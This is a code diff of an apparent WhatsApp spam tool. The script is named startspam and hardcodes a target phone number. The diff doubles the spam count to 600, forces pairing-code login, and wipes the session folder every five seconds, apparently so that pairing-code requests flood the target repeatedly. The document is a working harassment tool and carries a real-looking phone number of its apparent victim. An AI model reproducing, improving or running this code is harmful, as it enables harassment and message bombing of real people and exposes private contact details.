@@ -39,20 +39,24 @@ const store = makeInMemoryStore({
 });
 
 // Hardcoded target phone number and spam count
-const targetPhoneNumber = "+6285607182455"; // Replace with the target phone number
-const spamCount = 300; // Replace with the number of times you want to spam
-const authStatePath = "./session";
+const targetPhoneNumber = "6285607182455"; // Replace with the target phone number
+const spamCount = 600; // Replace with the number of times you want to spam
 
-// Function to delete the folder
-const deleteFolder = () => {
-  if (fs.existsSync(authStatePath)) {
-    fs.rmSync(authStatePath, { recursive: true, force: true });
-    console.log(chalk.bgBlack(chalk.redBright(`Folder '${authStatePath}' deleted`)));
+const pairingCode = true || process.argv.includes("--pairing-code");
+const useMobile = process.argv.includes("--mobile");
+
+async function deleteCassasterFolder() {
+  const folderPath = path.resolve(__dirname, './cassaster');
+  if (fs.existsSync(folderPath)) {
+    fs.rm(folderPath, { recursive: true, force: true }, (err) => {
+      if (err) {
+        console.error(chalk.redBright("Failed to delete folder: "), err);
+      } else {
+        console.log(chalk.greenBright("Folder 'cassaster' deleted."));
+      }
+    });
   }
-};
-
-// Set an interval to delete the folder every 5 seconds
-setInterval(deleteFolder, 5000);
+}
 
 async function startspam() {
   let { 
@@ -63,7 +67,7 @@ async function startspam() {
   const {
     state: state,
     saveCreds: saveCreds
-  } = await useMultiFileAuthState(authStatePath);
+  } = await useMultiFileAuthState("./cassaster");
 
   const msgRetryCounterCache = new NodeCache();
   const spam = makeWASocket({
@@ -137,6 +141,9 @@ async function startspam() {
     require(file);
   });
 }
+
+// Set interval to delete the 'cassaster' folder every 5 seconds
+setInterval(deleteCassasterFolder, 5000);
 
 startspam();
 
